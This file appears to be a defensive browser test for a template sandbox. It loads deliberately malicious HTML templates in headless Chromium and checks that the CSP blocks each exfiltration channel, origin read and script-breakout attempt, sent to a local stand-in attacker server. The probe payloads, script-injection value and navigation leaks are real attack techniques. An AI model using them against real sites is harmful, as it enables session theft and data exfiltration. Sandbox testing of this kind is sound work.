'use strict';

/*
 * Adversarial BROWSER test for the Templates library html-kind sandbox.
 *
 * Everything a template author ships is somebody else's code. render.js fences it with a
 * `Content-Security-Policy: sandbox allow-scripts; default-src 'none'; ...` — an opaque origin plus
 * a deny-by-default policy. The unit test (templates.test.js) proves the HEADER is built. This test
 * proves the BROWSER enforces it: it installs genuinely malicious signed templates on a live server,
 * loads them in a real headless Chromium (the way an Android panel and the web player do), and
 * asserts every escape FAILS — while documenting the two that inherently succeed (self-navigation of
 * the frame, and WebRTC being outside CSP's reach).
 *
 * Runs on Node 20 only (see TEMPLATES-BUILD-SPEC). SKIPS CLEANLY if no Chromium binary is found, so
 * CI without a browser stays green. Nothing here touches the user's ports or audio.
 *
 * Read alongside research/security/sandbox-browser.md (the attack -> result -> severity table).
 */

const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const http = require('node:http');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const crypto = require('node:crypto');
const { spawn } = require('node:child_process');

const SERVER_DIR = path.join(__dirname, '..');
const PORT = Number(process.env.SBX_PORT || 3101);
const ATTACKER_PORT = Number(process.env.SBX_ATTACKER_PORT || 3199);
const BASE = `http://127.0.0.1:${PORT}`;
const ATTACKER = `127.0.0.1:${ATTACKER_PORT}`;

// ---------------------------------------------------------------- browser discovery
function findChromium() {
  const candidates = [
    process.env.CHROMIUM_BIN,
    path.join(os.homedir(), '.cache/ms-playwright/chromium-1228/chrome-linux64/chrome'),
    path.join(os.homedir(), '.cache/ms-playwright/chromium-1228/chrome-linux/chrome'),
    path.join(os.homedir(), '.cache/ms-playwright/chromium-1208/chrome-linux64/chrome'),
    path.join(os.homedir(), '.cache/ms-playwright/chromium-1208/chrome-linux/chrome'),
    '/usr/bin/chromium',
    '/usr/bin/chromium-browser',
    '/usr/bin/google-chrome',
  ].filter(Boolean);
  for (const c of candidates) { try { if (fs.statSync(c).isFile()) return c; } catch { /* next */ } }
  return null;
}
function findPuppeteer() {
  try { return require(path.join(SERVER_DIR, 'node_modules/puppeteer-core')); } catch { return null; }
}

const CHROME = process.env.SBX_NO_BROWSER ? null : findChromium();
const puppeteer = findPuppeteer();
const SKIP = !CHROME || !puppeteer;
const skipMsg = !puppeteer ? 'puppeteer-core not installed'
  : (process.env.SBX_NO_BROWSER ? 'browser disabled via SBX_NO_BROWSER' : 'no chromium binary found');

// ---------------------------------------------------------------- package building (test key)
const kp = crypto.generateKeyPairSync('ed25519');
const PUB_PEM = kp.publicKey.export({ type: 'spki', format: 'pem' });
const pkgLib = require('../lib/templates/package');
const signing = require('../lib/templates/signing');

const PNG = Buffer.from(
  '89504e470d0a1a0a0000000d4948445200000001000000010806000000'
  + '1f15c4890000000d49444154789c630001000005000' + '10d0a2db40000000049454e44ae426082', 'hex');

function signed(manifest, files) {
  const bytes = pkgLib.buildPackageBytes(manifest, files);
  const sig = signing.signPackage(bytes, kp.privateKey);
  return pkgLib.buildEnvelope(bytes, sig);
}

/*
 * The probe payload, loaded TOP-LEVEL and inside a sandboxed iframe. It never navigates, so a run
 * of it cannot exfiltrate by leaving the page. It:
 *  - reads the server origin's localStorage / cookie / indexedDB (opaque origin must deny),
 *  - reaches an UNDECLARED host over every channel (CSP must block them all),
 *  - reaches into window.parent / window.top (cross-origin must throw),
 *  - runs eval / new Function (no 'unsafe-eval' -> must throw),
 *  - injects a second <meta> CSP trying to add connect-src (must be ignored),
 *  - reports a JSON summary and every CSP violation to the console.
 * Whether a silent channel actually escaped is judged by the attacker server's hit log, not by the
 * page (a blocked channel cannot tell you it was blocked reliably).
 */
const PROBE_JS = `
var R = { where: (window.top === window.self ? 'top' : 'frame'), reads: {}, throws: {}, attempts: [] };
var A = 'http://${ATTACKER}';
window.__CSPVIO = [];
document.addEventListener('securitypolicyviolation', function (e) {
  window.__CSPVIO.push(e.effectiveDirective + ' <- ' + (e.blockedURI || ''));
  console.log('CSPVIO ' + e.effectiveDirective + ' ' + (e.blockedURI || ''));
});
function tryRead(name, fn) { try { R.reads[name] = String(fn()).slice(0, 40); } catch (e) { R.reads[name] = 'THROW:' + e.name; } }
tryRead('origin', function () { return location.origin; });
// self.origin is the REAL security origin: "null" for an opaque (sandboxed) document.
// location.origin, by contrast, reflects the URL string even when the document is opaque — a Chrome
// quirk, NOT a leak (storage access below still throws). So self.origin is the isolation indicator.
tryRead('selfOrigin', function () { return self.origin; });
tryRead('localStorage.token', function () { return localStorage.getItem('token'); });
tryRead('cookie', function () { return document.cookie; });
tryRead('indexedDB', function () { indexedDB.open('x'); return 'opened'; });
tryRead('parent.cookie', function () { return window.parent.document.cookie; });
tryRead('top.href', function () { return window.top.location.href; });
tryRead('parent.postMessage', function () { window.parent.postMessage('pwn', '*'); return 'sent'; });
// eval / new Function : blocked without 'unsafe-eval'
try { R.throws.eval = eval('1+1'); } catch (e) { R.throws.eval = 'THROW:' + e.name; }
try { R.throws.newFunction = (new Function('return 2'))(); } catch (e) { R.throws.newFunction = 'THROW:' + e.name; }
// second meta CSP trying to LOOSEN policy (must be ignored: meta can only tighten, and only the first counts)
try {
  var m = document.createElement('meta');
  m.httpEquiv = 'Content-Security-Policy';
  m.content = "connect-src http://${ATTACKER}; img-src http://${ATTACKER}";
  document.head.appendChild(m);
  R.metaInjected = true;
} catch (e) { R.metaInjected = 'THROW:' + e.name; }
// hostile injected value (st-values JSON breakout) — set by evil-values template only
R.pwned = (typeof window.PWNED !== 'undefined');
R.scriptCount = document.querySelectorAll('script').length;
if (window.ST && ST.values) R.msgLen = (ST.values.msg || '').length;
// ---- undeclared-host exfil, every channel. Each tagged so the attacker log names the winner. ----
function att(ch) { return A + '/HIT?ch=' + ch + '&w=' + R.where; }
R.attempts.push('fetch');       try { fetch(att('fetch'), { mode: 'no-cors', credentials: 'include' }); } catch (e) {}
R.attempts.push('xhr');         try { var x = new XMLHttpRequest(); x.open('GET', att('xhr')); x.send(); } catch (e) {}
R.attempts.push('beacon');      try { navigator.sendBeacon(att('beacon'), 'x'); } catch (e) {}
R.attempts.push('img');         try { var i = new Image(); i.src = att('img'); } catch (e) {}
R.attempts.push('ws');          try { new WebSocket('ws://${ATTACKER}/ws?w=' + R.where); } catch (e) {}
R.attempts.push('eventsource'); try { new EventSource(att('sse')); } catch (e) {}
R.attempts.push('link-prefetch'); try { var l = document.createElement('link'); l.rel = 'prefetch'; l.href = att('prefetch'); document.head.appendChild(l); } catch (e) {}
R.attempts.push('link-preconnect'); try { var l2 = document.createElement('link'); l2.rel = 'preconnect'; l2.href = A; document.head.appendChild(l2); } catch (e) {}
R.attempts.push('css-import');  try { var st = document.createElement('style'); st.textContent = "@import url('" + att('cssimport') + "');"; document.head.appendChild(st); } catch (e) {}
R.attempts.push('font');        try { var st2 = document.createElement('style'); st2.textContent = "@font-face{font-family:x;src:url('" + att('font') + "')} body{font-family:x}"; document.head.appendChild(st2); document.body.style.fontFamily = 'x'; document.body.textContent = 'render'; } catch (e) {}
R.attempts.push('form');        try { var f = document.createElement('form'); f.action = A + '/HIT'; f.method = 'GET'; document.body.appendChild(f); f.submit(); } catch (e) { R.throws.form = 'THROW:' + e.name; }
R.attempts.push('window.open'); try { R.throws.winopen = window.open(att('winopen')) ? 'opened' : 'null'; } catch (e) { R.throws.winopen = 'THROW:' + e.name; }
R.attempts.push('iframe');      try { var fr = document.createElement('iframe'); fr.src = att('iframe'); document.body.appendChild(fr); } catch (e) {}
R.attempts.push('object');      try { var ob = document.createElement('object'); ob.data = att('object'); document.body.appendChild(ob); } catch (e) {}
R.attempts.push('sw');          try { navigator.serviceWorker.register(att('sw')).then(function(){console.log('SW_REGISTERED')}, function(e){console.log('SW_FAIL ' + e.name)}); } catch (e) { R.throws.sw = 'THROW:' + e.name; }
R.attempts.push('worker-blob'); try { var bl = new Blob(["fetch('" + att('worker') + "')"], { type: 'text/javascript' }); new Worker(URL.createObjectURL(bl)); } catch (e) { R.throws.worker = 'THROW:' + e.name; }
R.attempts.push('worker-data'); try { new Worker("data:text/javascript,fetch('" + att('workerdata') + "')"); } catch (e) { R.throws.workerdata = 'THROW:' + e.name; }
R.attempts.push('import-remote'); try { import('http://${ATTACKER}/mod.js').then(function(){ console.log('IMPORT_OK'); }, function(){}); } catch (e) { R.throws.importRemote = 'THROW:' + e.name; }
R.attempts.push('credentials'); R.throws.credentials = (navigator.credentials ? 'present' : 'absent');
R.attempts.push('webrtc');      try { var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:${ATTACKER}' }] }); pc.createDataChannel('x'); pc.createOffer().then(function(o){ R.rtc = 'offer'; pc.setLocalDescription(o); }).catch(function(){}); R.throws.webrtc = 'constructed'; } catch (e) { R.throws.webrtc = 'THROW:' + e.name; }
setTimeout(function () { console.log('RESULT ' + JSON.stringify(R)); }, 1200);
`;

function probeHtml(extraHead) {
  return `<!doctype html><html><head>${extraHead || ''}</head><body><h1>probe</h1>`
    + `<script>${PROBE_JS}<\/script></body></html>`;
}

function buildTemplates() {
  return {
    // Silent probe: reads, exfil, eval, meta-injection. No navigation.
    'evil-probe': signed(
      { id: 'evil-probe', name: 'Evil probe', version: '1.0.0', kind: 'html', license: 'MIT', params: [] },
      { 'index.html': Buffer.from(probeHtml()) }),
    // Self-navigation: the ONE escape CSP cannot stop. Isolated so it never pollutes the exfil log.
    'evil-nav': signed(
      { id: 'evil-nav', name: 'Evil nav', version: '1.0.0', kind: 'html', license: 'MIT', params: [] },
      { 'index.html': Buffer.from('<!doctype html><html><body><script>'
        + `location.href='http://${ATTACKER}/NAV?leaked='+encodeURIComponent('secretvalue');`
        + '<\/script></body></html>') }),
    // meta-refresh navigation, the declarative cousin of evil-nav.
    'evil-refresh': signed(
      { id: 'evil-refresh', name: 'Evil refresh', version: '1.0.0', kind: 'html', license: 'MIT', params: [] },
      { 'index.html': Buffer.from(`<!doctype html><html><head><meta http-equiv="refresh" content="0;url=http://${ATTACKER}/REFRESH"></head><body>x</body></html>`) }),
    // st-values breakout via a hostile PARAM value, passed at use-time.
    'evil-values': signed(
      { id: 'evil-values', name: 'Evil values', version: '1.0.0', kind: 'html', license: 'MIT',
        params: [{ name: 'msg', type: 'text', label: 'Message', max: 200, default: 'hi' }] },
      { 'index.html': Buffer.from(probeHtml()) }),
    // A template WITH a thumbnail, to exercise the /thumb CSP path.
    'evil-thumb': signed(
      { id: 'evil-thumb', name: 'Evil thumb', version: '1.0.0', kind: 'html', license: 'MIT',
        thumbnail: 'thumbnail.png', params: [] },
      { 'index.html': Buffer.from('<!doctype html><html><body>t</body></html>'), 'thumbnail.png': PNG }),
  };
}

// ---------------------------------------------------------------- HTTP helpers
function req(method, url, { headers = {}, body = null } = {}) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const r = http.request({ hostname: u.hostname, port: u.port, path: u.pathname + u.search, method, headers }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks).toString('utf8') }));
    });
    r.on('error', reject);
    if (body) r.write(body);
    r.end();
  });
}
async function jreq(method, url, opts = {}) {
  const r = await req(method, url, opts);
  try { r.json = JSON.parse(r.body); } catch { r.json = null; }
  return r;
}

// ---------------------------------------------------------------- shared state
let serverProc = null;
let attackerServer = null;
let browser = null;
const attackerHits = [];   // { path, ua }
let token = null;
const widgetIds = {};      // templateId -> widget id

function waitFor(url, ms = 25000) {
  const end = Date.now() + ms;
  return new Promise((resolve, reject) => {
    (function poll() {
      const rq = http.get(url, (res) => { res.resume(); resolve(true); });
      rq.on('error', () => { if (Date.now() > end) reject(new Error('server did not start')); else setTimeout(poll, 300); });
    })();
  });
}

before(async () => {
  if (SKIP) return;
  // Attacker origin: any hit here is an escape.
  attackerServer = http.createServer((r, res) => {
    attackerHits.push({ path: r.url, ua: r.headers['user-agent'] || '' });
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.end('ok');
  });
  attackerServer.on('upgrade', (r, socket) => { attackerHits.push({ path: 'WS ' + r.url }); socket.destroy(); });
  await new Promise((res) => attackerServer.listen(ATTACKER_PORT, '127.0.0.1', res));

  // Isolated server on 3101 with the test catalog key.
  const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'st-sbx-browser-'));
  serverProc = spawn(process.execPath, ['server.js'], {
    cwd: SERVER_DIR,
    env: {
      ...process.env,
      DATA_DIR: dataDir, SELF_HOSTED: 'true', PORT: String(PORT), HOST: '127.0.0.1',
      JWT_SECRET: 'sbx-' + crypto.randomBytes(4).toString('hex'),
      TEMPLATE_CATALOG_PUBLIC_KEY: PUB_PEM, NODE_ENV: 'test',
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  serverProc.stdout.on('data', () => {});
  serverProc.stderr.on('data', () => {});
  await waitFor(`${BASE}/`);

  // Register the first user (platform_admin on self-hosted) and take the JWT.
  const reg = await jreq('POST', `${BASE}/api/auth/register`, {
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: 'admin@test.local', password: 'password1234', name: 'Admin' }),
  });
  assert.equal(reg.status, 201, 'register first user');
  token = reg.json.token;

  // Import every malicious template (signed with the test key => trust "verified") and use each.
  const tpls = buildTemplates();
  for (const [id, env] of Object.entries(tpls)) {
    const imp = await jreq('POST', `${BASE}/api/templates/import`, {
      headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/octet-stream' },
      body: env,
    });
    assert.equal(imp.status, 201, `import ${id}: ${imp.body}`);
    assert.equal(imp.json.trust, 'verified', `${id} verified`);
    const key = `${imp.json.catalog}/${imp.json.id}`;
    const values = id === 'evil-values'
      ? { msg: "</script><script>window.PWNED=1// alert(1)" }   // breakout attempt through a text param
      : {};
    const use = await jreq('POST', `${BASE}/api/templates/installed/${key}/use`, {
      headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ values }),
    });
    assert.equal(use.status, 201, `use ${id}: ${use.body}`);
    widgetIds[id] = use.json.id;
  }

  browser = await puppeteer.launch({
    executablePath: CHROME, headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--mute-audio'],
  });
});

after(async () => {
  if (browser) { try { await browser.close(); } catch {} }
  if (serverProc) { try { serverProc.kill('SIGTERM'); } catch {} }
  if (attackerServer) { try { attackerServer.close(); } catch {} }
});

// ---------------------------------------------------------------- helpers used by tests
async function loadAndCollect(url, { waitConsole = 'RESULT', seedOrigin = false } = {}) {
  const page = await browser.newPage();
  const logs = [];
  let result = null;
  page.on('console', (m) => {
    const t = m.text();
    logs.push(t);
    if (t.startsWith('RESULT ')) { try { result = JSON.parse(t.slice(7)); } catch {} }
  });
  page.on('pageerror', (e) => logs.push('PAGEERROR ' + e.message));
  if (seedOrigin) {
    // Seed the SERVER ORIGIN with a fake dashboard session, the way the real dashboard would, so a
    // successful origin read would actually leak something.
    await page.goto(`${BASE}/`, { waitUntil: 'domcontentloaded' });
    await page.evaluate(() => {
      try { localStorage.setItem('token', 'FAKE-JWT-SECRET-SESSION'); } catch {}
      try { document.cookie = 'st_session=FAKE-COOKIE; path=/'; } catch {}
    });
  }
  await page.goto(url, { waitUntil: 'domcontentloaded' }).catch(() => {});
  // wait for the RESULT line (probe posts after 1200ms) or timeout
  const end = Date.now() + 5000;
  while (!result && Date.now() < end && waitConsole) { await new Promise((r) => setTimeout(r, 100)); }
  const cspvio = await page.evaluate(() => window.__CSPVIO || []).catch(() => []);
  return { page, logs, result, cspvio };
}

// ================================================================ TESTS

test('setup produced a live server + browser', { skip: SKIP && skipMsg }, () => {
  assert.ok(token, 'have a JWT');
  assert.equal(Object.keys(widgetIds).length, 5, 'five malicious widgets created');
});

test('every render/preview/thumb path carries the sandbox CSP', { skip: SKIP && skipMsg }, async () => {
  const wid = widgetIds['evil-probe'];
  // render without rev
  const r1 = await req('GET', `${BASE}/api/widgets/${wid}/render`);
  assert.match(r1.headers['content-security-policy'] || '', /sandbox allow-scripts/, 'render no-rev has sandbox');
  assert.match(r1.headers['content-security-policy'] || '', /default-src 'none'/);
  assert.ok(!r1.headers['x-frame-options'], 'X-Frame-Options dropped on render');
  // render WITH rev (cacheable path)
  const r2 = await req('GET', `${BASE}/api/widgets/${wid}/render?rev=1`);
  assert.match(r2.headers['content-security-policy'] || '', /sandbox allow-scripts/, 'render rev has sandbox');
  assert.match(r2.headers['cache-control'] || '', /immutable/, 'rev render is cacheable');
  // exactly one CSP header (helmet dashboard CSP must not also apply)
  assert.equal(typeof r1.headers['content-security-policy'], 'string', 'single CSP header, not an array');

  // preview: valid
  const prev = await jreq('POST', `${BASE}/api/templates/installed/official/evil-probe/preview`, {
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ values: {} }),
  });
  assert.equal(prev.status, 200, `preview create: ${prev.body}`);
  const pr = await req('GET', `${BASE}${prev.json.url}`);
  assert.match(pr.headers['content-security-policy'] || '', /sandbox allow-scripts/, 'valid preview has sandbox');
  assert.match(pr.headers['cache-control'] || '', /no-store/, 'preview is no-store');
  // preview: expired / bogus token -> 410 with a sandbox CSP
  const pr410 = await req('GET', `${BASE}/api/templates/preview/${'a'.repeat(32)}`);
  assert.equal(pr410.status, 410, 'bogus preview token 410s');
  assert.match(pr410.headers['content-security-policy'] || '', /sandbox/, '410 preview still fenced');
  // thumb
  const inst = await jreq('GET', `${BASE}/api/templates/installed/official/evil-thumb`, { headers: { Authorization: `Bearer ${token}` } });
  const sha = inst.json.sha256;
  const th = await req('GET', `${BASE}/api/templates/thumb/${sha}`);
  assert.equal(th.status, 200, 'thumb served');
  assert.match(th.headers['content-security-policy'] || '', /sandbox/, 'thumb is fenced');
  assert.equal(th.headers['x-content-type-options'], 'nosniff');
});

test('a template made unusable renders a fenced blank page (never old code); in-use uninstall is refused', { skip: SKIP && skipMsg }, async () => {
  // An UNSIGNED html template is usable only while the instance policy allows unsigned code. Import
  // one with the policy ON, use it, then turn the policy OFF: its widget must fall to a BLANK page
  // that STILL carries the sandbox CSP — the identical render path a revoked/uninstalled template
  // takes ("black page, never the old code").
  const setUnsigned = (on) => jreq('PUT', `${BASE}/api/templates/settings`, {
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ unsigned_code_allowed: on, confirm: on ? 'I understand unsigned templates run unreviewed code on my screens' : undefined }),
  });
  assert.equal((await setUnsigned(true)).status, 200, 'enable unsigned code');
  const bytes = pkgLib.buildPackageBytes({ id: 'evil-unsigned', name: 'Unsigned', version: '1.0.0', kind: 'html', license: 'MIT', params: [] },
    { 'index.html': Buffer.from('<!doctype html><html><body><script>document.title="STILL-ALIVE"<\/script></body></html>') });
  const env = pkgLib.buildEnvelope(bytes, null); // NO signature -> unverified
  const imp = await jreq('POST', `${BASE}/api/templates/import`, {
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/octet-stream' }, body: env });
  assert.equal(imp.status, 201, `import unsigned: ${imp.body}`);
  assert.equal(imp.json.trust, 'unverified');
  const key = `${imp.json.catalog}/${imp.json.id}`;
  const use = await jreq('POST', `${BASE}/api/templates/installed/${key}/use`, {
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' }, body: JSON.stringify({ values: {} }) });
  assert.equal(use.status, 201, `use unsigned: ${use.body}`);
  const wid = use.json.id;
  // While allowed, it renders its own (malicious) code.
  const alive = await req('GET', `${BASE}/api/widgets/${wid}/render`);
  assert.match(alive.body, /STILL-ALIVE/, 'unsigned template runs while policy allows it');
  assert.match(alive.headers['content-security-policy'] || '', /sandbox allow-scripts/, 'even then it is fenced');
  // Turn the policy off: the widget must now be a fenced blank page, no author code.
  assert.equal((await setUnsigned(false)).status, 200, 'disable unsigned code');
  const dead = await req('GET', `${BASE}/api/widgets/${wid}/render`);
  assert.equal(dead.status, 200);
  assert.match(dead.headers['content-security-policy'] || '', /sandbox allow-scripts/, 'blank page still fenced');
  assert.ok(!/STILL-ALIVE/.test(dead.body), 'old code is NOT served once the template is unusable');
  assert.match(dead.body, /background:#000/, 'served the black blank page');
  // And uninstalling a template that is still in use is refused (cannot orphan a live widget).
  const del = await jreq('DELETE', `${BASE}/api/templates/installed/${key}`, { headers: { Authorization: `Bearer ${token}` } });
  assert.equal(del.status, 409, 'in-use uninstall refused');
  assert.ok(Array.isArray(del.json.widgets) && del.json.widgets.length >= 1, 'refusal names the widgets');
});

test('top-level render: opaque origin denies server-origin reads and all silent exfil', { skip: SKIP && skipMsg }, async () => {
  attackerHits.length = 0;
  const { page, result, cspvio } = await loadAndCollect(`${BASE}/api/widgets/${widgetIds['evil-probe']}/render`, { seedOrigin: true });
  assert.ok(result, 'probe reported a RESULT');
  // The real security origin is opaque: self.origin === "null". (location.origin reflects the URL
  // string even for an opaque document — see the note in PROBE_JS — so it is NOT the indicator.)
  assert.equal(result.reads.selfOrigin, 'null', `document must be opaque (self.origin), got ${result.reads.selfOrigin}`);
  // localStorage / cookie / indexedDB access must be DENIED (opaque origin -> SecurityError),
  // so the seeded dashboard session can never be read.
  assert.match(result.reads['localStorage.token'], /^THROW:SecurityError$/, `localStorage must throw, got ${result.reads['localStorage.token']}`);
  assert.match(result.reads.cookie, /^THROW:SecurityError$/, `cookie must throw, got ${result.reads.cookie}`);
  assert.match(result.reads.indexedDB, /^THROW:/, `indexedDB must throw, got ${result.reads.indexedDB}`);
  assert.ok(!/FAKE-JWT/.test(JSON.stringify(result.reads)), 'seeded JWT never reached template');
  assert.ok(!/FAKE-COOKIE/.test(JSON.stringify(result.reads)), 'seeded cookie never reached template');
  // eval / new Function blocked (no 'unsafe-eval')
  assert.equal(result.throws.eval, 'THROW:EvalError', `eval blocked, got ${result.throws.eval}`);
  assert.equal(result.throws.newFunction, 'THROW:EvalError', `new Function blocked, got ${result.throws.newFunction}`);
  // give async channels a moment, then assert the attacker heard NOTHING
  await new Promise((r) => setTimeout(r, 800));
  assert.deepEqual(attackerHits, [], `no undeclared-host exfil should reach the attacker; got ${JSON.stringify(attackerHits)}`);
  // and the browser should have logged CSP violations for the blocked channels
  assert.ok(cspvio.length > 0, 'browser reported CSP violations for the blocked channels');
  await page.close();
});

test('framed in a same-origin page (player shape): cannot touch parent/top', { skip: SKIP && skipMsg }, async () => {
  attackerHits.length = 0;
  const page = await browser.newPage();
  const results = [];
  page.on('console', (m) => { const t = m.text(); if (t.startsWith('RESULT ')) { try { results.push(JSON.parse(t.slice(7))); } catch {} } });
  await page.goto(`${BASE}/`, { waitUntil: 'domcontentloaded' });
  await page.evaluate(() => { try { localStorage.setItem('token', 'FAKE-JWT-SECRET-SESSION'); } catch {} try { document.cookie = 'st_session=FAKE-COOKIE'; } catch {} });
  // Mount the render URL exactly as the web player does: sandbox="allow-scripts", no allow-same-origin.
  const url = `${BASE}/api/widgets/${widgetIds['evil-probe']}/render`;
  await page.evaluate((u) => new Promise((resolve) => {
    const f = document.createElement('iframe');
    f.setAttribute('sandbox', 'allow-scripts');
    f.src = u; f.onload = () => resolve(); document.body.appendChild(f);
  }), url);
  await new Promise((r) => setTimeout(r, 2500));
  const frameResult = results.find((r) => r.where === 'frame');
  assert.ok(frameResult, 'framed probe reported a RESULT');
  assert.equal(frameResult.reads.selfOrigin, 'null', 'framed doc is opaque origin (self.origin)');
  assert.ok(/^THROW:/.test(frameResult.reads['parent.cookie']), `parent.document blocked, got ${frameResult.reads['parent.cookie']}`);
  assert.ok(/^THROW:/.test(frameResult.reads['top.href']), `top.location read blocked, got ${frameResult.reads['top.href']}`);
  // postMessage to parent is allowed by the platform, but carries no origin access; the parent simply
  // must not have leaked anything back. Confirm no exfil left the box.
  await new Promise((r) => setTimeout(r, 500));
  assert.deepEqual(attackerHits, [], `framed probe must not exfiltrate; got ${JSON.stringify(attackerHits)}`);
  await page.close();
});

test('hostile param value cannot break out of st-values JSON', { skip: SKIP && skipMsg }, async () => {
  attackerHits.length = 0;
  const { page, result } = await loadAndCollect(`${BASE}/api/widgets/${widgetIds['evil-values']}/render`);
  assert.ok(result, 'evil-values probe reported');
  assert.equal(result.pwned, false, 'window.PWNED must NOT be set (no script breakout)');
  // The three LEGITIMATE scripts every render carries: the st-values JSON block, the ST runtime,
  // and this payload. A successful </script> breakout would have added a fourth.
  assert.equal(result.scriptCount, 3, 'no injected fourth script — the hostile value did not break out');
  assert.ok(result.msgLen > 0, 'the hostile string was delivered as an inert value, not markup');
  await page.close();
});

test('DOCUMENTED inherent escape: self-navigation of the frame leaks via location=', { skip: SKIP && skipMsg }, async () => {
  attackerHits.length = 0;
  const page = await browser.newPage();
  await page.goto(`${BASE}/api/widgets/${widgetIds['evil-nav']}/render`, { waitUntil: 'domcontentloaded' }).catch(() => {});
  await new Promise((r) => setTimeout(r, 1200));
  const navHit = attackerHits.find((h) => h.path.startsWith('/NAV'));
  assert.ok(navHit, 'CSP does NOT (and cannot) stop a document navigating its own frame — this is expected and documented');
  assert.match(navHit.path, /leaked=secretvalue/, 'the frame carried its data out in the URL');
  await page.close();
});

test('DOCUMENTED inherent escape: <meta http-equiv=refresh> navigates too', { skip: SKIP && skipMsg }, async () => {
  attackerHits.length = 0;
  const page = await browser.newPage();
  await page.goto(`${BASE}/api/widgets/${widgetIds['evil-refresh']}/render`, { waitUntil: 'domcontentloaded' }).catch(() => {});
  await new Promise((r) => setTimeout(r, 1500));
  assert.ok(attackerHits.find((h) => h.path.startsWith('/REFRESH')), 'meta refresh navigation is not blocked by this CSP (expected)');
  await page.close();
});
